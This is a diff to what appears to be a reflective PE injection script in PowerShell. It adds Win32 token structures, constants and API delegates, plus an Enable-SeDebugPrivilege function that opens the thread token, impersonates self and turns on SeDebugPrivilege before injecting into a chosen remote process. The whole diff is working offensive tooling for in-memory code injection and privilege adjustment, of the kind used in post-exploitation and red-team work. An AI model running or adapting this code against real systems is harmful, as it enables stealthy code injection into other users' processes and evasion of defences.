@@ -460,6 +460,30 @@ $RemoteScriptBlock = {
 		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
 		
+		#Struct LUID
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
+		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
+		$LUID = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
+		
+		#Struct LUID_AND_ATTRIBUTES
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
+		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
+		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
+		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
+		
+		#Struct TOKEN_PRIVILEGES
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
+		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
+		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
+		
 		return $Win32Types
 	}
 
@@ -492,6 +516,10 @@ $RemoteScriptBlock = {
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
 		
 		return $Win32Constants
 	}
@@ -589,6 +617,31 @@ $RemoteScriptBlock = {
         $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
         $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
+		
+		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
+        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
+        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
+		
+		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
+        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
+        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
+		
+		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
+        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
+        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
+		
+		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
+        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
+        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
+		
+		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
+        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
+        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
 		
 		return $Win32Functions
 	}
@@ -872,6 +925,77 @@ $RemoteScriptBlock = {
 	    # Return the address of the function
 	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 	}
+	
+	
+	Function Enable-SeDebugPrivilege
+	{
+		Param(
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Types,
+		
+		[Parameter(Position = 3, Mandatory = $true)]
+		[System.Object]
+		$Win32Constants
+		)
+		
+		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
+		if ($ThreadHandle -eq [IntPtr]::Zero)
+		{
+			Throw "Unable to get the handle to the current thread"
+		}
+		
+		[IntPtr]$ThreadToken = [IntPtr]::Zero
+		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+		if ($Result -eq $false)
+		{
+			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
+			{
+				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
+				if ($Result -eq $false)
+				{
+					Throw "Unable to impersonate self"
+				}
+				
+				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+				if ($Result -eq $false)
+				{
+					Throw "Unable to OpenThreadToken."
+				}
+			}
+			else
+			{
+				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
+			}
+		}
+		
+		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.LUID))
+		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
+		if ($Result -eq $false)
+		{
+			Throw "Unable to call LookupPrivilegeValue"
+		}
+		
+		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.TOKEN_PRIVILEGES)
+		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
+		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, $Win32Types.TOKEN_PRIVILEGES)
+		$TokenPrivileges.PrivilegeCount = 1
+		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, $Win32Types.LUID)
+		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
+		
+		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+		if ($Result -eq $false)
+		{
+			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+			Throw "Unable to call AdjustTokenPrivileges. Errorcode: $ErrorCode"
+		}
+	}
 
 
 	#Function written by Lee Holmes, Blog: http://www.leeholmes.com/blog/
@@ -979,7 +1103,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			$imageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, $Win32Types.IMAGE_NT_HEADERS32)
+			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, $Win32Types.IMAGE_NT_HEADERS32)
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
 		}
@@ -2459,6 +2583,9 @@ $RemoteScriptBlock = {
 				$ProcId = $Processes.ID
 			}
 		}
+		
+		#todo only do this for remote processes
+		Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
 		
 		if (($ProcId -ne $null) -and ($ProcId -ne 0))
 		{
